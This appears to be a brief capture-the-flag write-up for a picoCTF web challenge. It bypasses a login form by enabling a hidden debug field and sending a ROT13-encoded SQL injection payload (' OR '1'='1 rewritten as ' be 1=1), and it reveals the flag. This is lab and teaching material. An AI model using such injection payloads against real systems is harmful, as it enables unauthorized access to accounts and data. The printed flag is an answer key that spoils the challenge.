## Goal


## Solution
+ I opened the link
+ Inspect all parts of the site, it mentions you have a sql error, you probably have errors in your database, so the way to enter would be by SQL Injection
+ We open the browser inspector mode and inspect the code. There is a line of code that is going to be modified:
	 input type="hidden" name="debug" value="0"
	 input type="hidden" name="debug" value="1"
+ Now we try to do SQL Injection on the password section ' OR '1'='1
+ We will be redirected to a page with this content:
password: ' or 1=1;
SQL query: SELECT * FROM admin where password = ' ' ' be 1=1;'
+ We use cyberchef to verify what type of encryption you are using, use rot13.
+ So we enter the encrypted password **' be 1=1** and it will redirect us to the flag.

password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
Logged in!
Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}


## Notes

## References
[Cyberchef](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=JyBiZSAxPTEn)